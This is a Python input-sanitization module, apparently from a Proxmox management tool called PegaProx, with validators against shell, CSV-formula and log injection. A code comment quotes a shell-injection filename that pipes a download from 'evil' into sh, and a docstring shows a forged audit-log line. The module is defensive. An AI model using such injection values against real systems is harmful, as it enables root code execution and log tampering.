# -*- coding: utf-8 -*-
"""
PegaProx Input Sanitization - Layer 2
"""

import re
import html

# NS: split from monolith - these were scattered all over the place before


def sanitize_string(value: str, max_length: int = 1000, allow_html: bool = False) -> str:
    """sanitize string input, escape html by default"""
    if not isinstance(value, str):
        value = str(value) if value is not None else ''
    
    # Truncate to max length
    value = value[:max_length]
    
    # Strip null bytes and other control characters (0x0b = vertical tab, 0x0c = form feed)
    # MK: the regex looks scary but its just ASCII C0 control chars minus \t \n \r
    value = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', value)
    
    # Escape HTML if not allowed
    if not allow_html:
        value = html.escape(value)
    
    return value.strip()


def sanitize_identifier(value: str, max_length: int = 64) -> str:
    """sanitize identifier - alphanumeric, underscore, hyphen, dot only"""
    if not isinstance(value, str):
        value = str(value) if value is not None else ''
    
    # Only allow safe characters
    value = re.sub(r'[^a-zA-Z0-9_\-\.]', '', value)
    
    return value[:max_length]


def sanitize_username(value: str, max_length: int = 64) -> str:
    """sanitize username — allows @ for email-style logins"""
    if not isinstance(value, str):
        value = str(value) if value is not None else ''
    value = re.sub(r'[^a-zA-Z0-9_\-\.@\+]', '', value)
    return value[:max_length]


def sanitize_int(value, default: int = 0, min_val: int = None, max_val: int = None) -> int:
    """Sanitize an integer input"""
    try:
        result = int(value)
        if min_val is not None and result < min_val:
            result = min_val
        if max_val is not None and result > max_val:
            result = max_val
        return result
    except (ValueError, TypeError):
        return default


def sanitize_bool(value, default: bool = False) -> bool:
    """Sanitize a boolean input"""
    if isinstance(value, bool):
        return value
    if isinstance(value, str):
        return value.lower() in ('true', '1', 'yes', 'on')
    if isinstance(value, int):
        return value != 0
    return default


def validate_email(email: str) -> bool:
    """Validate email format"""
    if not email or not isinstance(email, str):
        return False
    # Simple regex - not perfect but catches most issues
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email))


def validate_hostname(hostname: str) -> bool:
    """Validate hostname/IP format"""
    if not hostname or not isinstance(hostname, str):
        return False
    # Allow IP addresses and hostnames
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    hostname_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$'
    return bool(re.match(ip_pattern, hostname) or re.match(hostname_pattern, hostname))


def validate_storage_name(storage) -> bool:
    """Validate Proxmox / XCP-ng storage identifier.

    PVE/XCP storage names are alphanumeric + dash + underscore + dot. Anything
    outside that set has no legitimate use in our context and reaching us is a
    sign of an injection attempt against the `pvesm` / `qm` shell calls that
    embed the storage name. MK May 2026 (Aikido #481 port — original PR was
    closed-superseded by mistake; manually ported after re-review.)
    """
    if not storage or not isinstance(storage, str):
        return False
    # Must start with alphanumeric, 1-100 chars total, set: [A-Za-z0-9._-]
    pattern = r'^[a-zA-Z0-9][a-zA-Z0-9_\-\.]{0,99}$'
    return bool(re.match(pattern, storage))


# NS Jul 2026 (pentest CRIT) — ISO/template filenames flow UNESCAPED into SSH
# shell commands on PVE nodes (sync_content_to_nodes: `test -f '<path>/<filename>'`,
# scp/sftp relay). They are only single-quoted, so a filename containing a quote
# (`x'; curl evil|sh; echo '`) breaks out → root RCE on every node, reachable by a
# low-priv storage.upload holder. A PVE ISO/vztmpl filename is a single path
# component of [A-Za-z0-9._+-] (e.g. debian-12.iso, ubuntu_22.04-1_amd64.tar.zst) —
# reject anything else (no '/', no spaces, no shell metachars) and fail closed.
_CONTENT_FILENAME_RE = re.compile(r'^[A-Za-z0-9][A-Za-z0-9._+\-]{0,254}$')

def validate_content_filename(value) -> bool:
    """True if `value` is a safe single ISO/template filename for the content-sync
    shell path (one component, no '/'/space/shell-metachars). Empty → False."""
    if not value or not isinstance(value, str):
        return False
    return bool(_CONTENT_FILENAME_RE.match(value))


# NS 2026-06-05 (security audit C-2/M-2): ESXi datastore names and VM-directory
# names flow UNQUOTED into root shell commands on the PVE node (sshfs mounts,
# qemu-img, find). VMware allows letters/digits/space and a small punctuation
# set in these; a single component never contains '/'. Anything with shell
# metacharacters (; | & $ ` < > newlines quotes backslash) or a slash is an
# injection attempt against the V2P shell pipeline — reject it hard, fail closed.
_ESXI_NAME_RE = re.compile(r'^[A-Za-z0-9][A-Za-z0-9 ._()+\-]{0,127}$')

def validate_esxi_path_component(value) -> bool:
    """True if `value` is a safe single ESXi datastore / directory name.

    NOT a full path — one path component only (no '/'). Used to gate the
    user-supplied esxi_datastore / esxi_vm_dir before they reach the V2P
    SSHFS + qemu-img shell calls. Empty is rejected; callers that allow
    auto-detect must check for empty BEFORE calling this.
    """
    if not value or not isinstance(value, str):
        return False
    return bool(_ESXI_NAME_RE.match(value))


def sanitize_csv_field(value) -> str:
    """Sanitize field for CSV export to prevent formula injection.
    
    Neutralizes leading characters (=, +, -, @, tab, carriage return) that
    spreadsheet applications interpret as formula prefixes. Prepends a single
    quote to force literal interpretation while preserving the original value.
    
    References:
    - OWASP: https://owasp.org/www-community/attacks/CSV_Injection
    - CWE-1236: Improper Neutralization of Formula Elements in a CSV File
    """
    if value is None:
        return ''
    
    # Convert to string
    s = str(value)
    
    # Check if the field starts with a formula-triggering character
    # =, +, -, @ are the primary formula prefixes
    # \t (tab) and \r (carriage return) can also be exploited in some contexts
    if s and s[0] in ('=', '+', '-', '@', '\t', '\r'):
        # Prepend single quote to force literal interpretation
        # This is the recommended mitigation per OWASP guidance
        return "'" + s

    return s


def sanitize_log_message(value) -> str:
    """Strip CR/LF from a value before writing it to the text audit log.

    Without this, an attacker who controls any audit field (e.g. submits a
    username containing `\\nAudit: admin - deleted_everything`) could inject
    a fake-looking log line and confuse anyone tailing the file. The DB
    record stores the unmodified value, so this only sanitises the text
    stream.

    CWE-117 / OWASP Log Injection.
    """
    if value is None:
        return ''
    # MK May 2026 - cheap str-replace, called on every audit log write.
    # Also strips the unicode line separators U+2028/U+2029 which some viewers
    # (and json.dumps without ensure_ascii) treat as newlines. Tab is left
    # alone (legitimate in some action strings).
    s = str(value)
    s = s.replace('\r', ' ').replace('\n', ' ')
    s = s.replace('\u2028', ' ').replace('\u2029', ' ')
    return s


